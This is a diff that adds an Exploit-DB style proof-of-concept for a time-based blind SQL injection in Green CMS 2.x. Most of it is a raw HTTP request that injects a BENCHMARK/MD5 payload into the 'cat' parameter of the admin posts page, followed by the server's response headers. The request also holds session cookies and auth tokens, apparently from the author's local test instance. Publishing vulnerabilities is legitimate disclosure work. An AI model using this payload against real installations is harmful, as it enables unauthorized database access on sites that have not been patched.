@@ -1,0 +1,38 @@
+# Exploit Title: Green CMS 2.x - SQL Injection
+# Dork: N/A
+# Date: 2019-01-25
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.greencms.net/
+# Software Link: https://codeload.github.com/GreenCMS/GreenCMS/zip/beta
+# Version: 2.x
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/index.php?m=admin&c=posts&a=index&cat=[SQL]
+# 
+
+GET /[PATH]/index.php?m=admin&c=posts&a=index&cat=1%27))%20AND%201=BENCHMARK(100000000,MD5(0x456665))--%20- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=9kv875ue1nd30aem1r11v7j4e1; scd39=d417d5511c72c08320; token=0d74f7745ef2ae866371f379887de13b; poll-20190124084438702=x; Hm_lvt_7b43330a4da4a6f4353e553988ee8a62=1548345007; Hm_lpvt_7b43330a4da4a6f4353e553988ee8a62=1548345007; iCMS_iCMS_AUTH=23fead6b8NDfVdP8qVNpOPIPPUSpFJAso5x4PtfIdZ3nDi8o5wnWMSK3ChFfVeYSOHBG1oexoFRdZvpgU83b8Jf61eMlofgor_cA_M03jKYoXB3uVFTNACLmbQ; iCMS_USER_AUTH=219cbaebs-OpY5sJLvCCKTR3Dqt_oCHrxJW69eyU4H8ydfrP-oU2o_WTjmpI2rq_RlGfFU7z4khePqUAE_-e9BZoY7JqRmHEdQMwgIHvOFkLMuEm_MfWL5q_YjuZtjifggqF00S7XifyDwBoSSjLHF5_75serNlj4UzaM2Jx1UNECipmSjn0_LbHUxywdjrykOLebAf5KahIejKgbmJs25r1GkYT7kNAC4NCYzy8Bohr1Ty1LQpYq1D3Rid_82phOUD4q6sY3Ndaj8les5sAJvkEmXOwI8_y6lqBjZarygWlIh_O6b-nvRiE2cbaaMFsxJZZUlRvYU6RUWihB9yhFfg8UOZ9A41c_BdcyREjmQEGPPzBZnHBXZv4SbG-tj1gRr-L40L6EdGX-oKrbDC4oyt6vB0UzyzN9CZP5ZKWn8GzFGJAMWF7kFjPD_upiZiBd-rHyPyCZb0Tsr6920eRpm5ZPLiJ-cfKsR0Gm1s5vvsYO9BsTG1FogUhQwzjHbT4lIO3lUcpvxYSSc9wbE3R1izg2wME6ATQ6PEnszM; iCMS_userid=32dfb608S9QlPEJd2BZY81z70jgnBnJldGAo3OuRdbLJJbk_Qw; iCMS_nickname=32dfb608S9QlPEJd2BZY81b63296UnYxe2Yv3riRc-edc-xqFRw; ICMSSESSION=pahh0r0jsr9gre9e0vn1jmqp23; /PATH/modules/system/admin.php_SystemCustomtag_sortsel=name; /PATH/modules/system/admin.php_SystemCustomtag_ordersel=ASC; /PATH/modules/system/admin.php_limitsel=15; /PATH/modules/system/admin.php_SystemCustomtag_filtersel=default; /PATH/modules/system/admin.php_SystemPages_sortsel=page_title; /PATH/modules/system/admin.php_SystemPages_ordersel=ASC; /PATH/modules/system/admin.php_SystemPages_filtersel=default; /PATH/modules/content/admin/content.php_mod_content_Content_sortsel=content_title; /PATH/modules/content/admin/content.php_mod_content_Content_ordersel=ASC; /PATH/modules/content/admin/content.php_limitsel=15; /PATH/modules/content/admin/content.php_mod_content_Content_filtersel=default; Hm_lvt_48659a4ab85f1bcebb11d3dd3ecb6760=1548351649; Hm_lpvt_48659a4ab85f1bcebb11d3dd3ecb6760=1548355214; greencms_last_visit_page=aHR0cDovL2xvY2FsaG9zdC9leHBsb2l0ZGIvZ3JlZW5jbXMtYmV0YS9pbmRleC5waHA%2FbT1hZG1pbiZjPXBvc3RzJmE9aW5kZXgmY2F0PTElMjcpKSUyMEFORCUyMDE9QkVOQ0hNQVJLKDEwMDAwMDAwMCxNRDUoRWZlKSktLSUyMC0%3D; greencms_post_add1=x%9Cm%901k%C30%10%85%FFJ%D0%ECPI%B5-%5B%84%2C%1D2e%EAX%85%60YgG%E0%D8%22%3A%0D%A1%F4%BF%F7%9C+%C8%90%ED%DE%BB%EF%C1%BB%FBea%89xF%8F%130%CDL%AA%AD%94%265C%0F%26%95%83%1ALR%95l%0E7%80%F9%EB%F8%CD%8A%27%DF%2F3%C2%8C%94%D8%85%FD%0A%D6%DC%A4%AAU%AE+%01%A2%5ESe%BF3%1Fa%9F%23%DE%11-%B2%8A%D8a%8A%E4%84d%27%1F%2F%D9%C7%7BX%7BD%3F%8FT%28%9Bp%0DS%87o%16K+%8Fg%E9%9E%8C%E4%A2%DDr%B1%95%E5Fr%FD%D9jYg%E2%BA8%3Fxp%AFT%B5%E1Rs%A1%C5J%F5%1DR%AB%1F%2Az%2A%18v%E3C%D0W%5Ci%E9%2B%D6U47%5C%D1%7DV%01%3B%FD%FD%03%84%F0b%FF
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Thu, 24 Jan 2019 22:36:36 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: GreenCMS Community Version
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: private
+Pragma: no-cache
+Set-Cookie: greencms_last_visit_page=aHR0cDovL2xvY2FsaG9zdC9leHBsb2l0ZGIvZ3JlZW5jbXMtYmV0YS9pbmRleC5waHA%2FbT1hZG1pbiZjPXBvc3RzJmE9aW5kZXgmY2F0PTElMjcpKSUyMEFORCUyMDE9QkVOQ0hNQVJLKDEwMDAwMDAwMCxNRDUoMHg0NTY2NjUpKS0tJTIwLQ%3D%3D; expires=Sat, 23-Feb-2019 19:14:36 GMT; Max-Age=2592000; path=/
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=
